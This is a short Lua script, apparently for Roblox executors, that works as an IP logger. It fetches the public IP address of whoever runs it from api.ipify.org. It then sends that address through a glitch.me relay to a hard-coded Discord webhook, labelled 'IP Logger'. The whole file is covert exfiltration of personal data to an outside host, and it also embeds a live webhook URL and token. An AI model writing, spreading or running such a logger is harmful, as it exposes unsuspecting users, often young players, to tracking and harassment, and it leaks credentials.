local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
local function SendMessage(Webhook, Message, Botname)
   if not string.find(Webhook, "https://discord.com/api/webhooks/1004663750986571807/BQktUKUxGEU5MfKcFHndNWoQBJpwfnQa0q6UEKI1NcYno0midRMhPOj5EsVrH1A48N7m") then
       return error("Send a valid URL");
   end
   local Name;
   local API = "http://buritoman69.glitch.me/webhook";
   if (not Message or Message == "32" or not Botname) then
       Name = "GameBot"
       return error("nil or empty message!")
   else
       Name = Botname;
   end
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook 
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:HttpPost(API, Body, false, "application/json")
   return Data or nil;
end
SendMessage("https://discord.com/api/webhooks/1004663750986571807/BQktUKUxGEU5MfKcFHndNWoQBJpwfnQa0q6UEKI1NcYno0midRMhPOj5EsVrH1A48N7m","IP: "..ip.." was logged.", "IP Logger")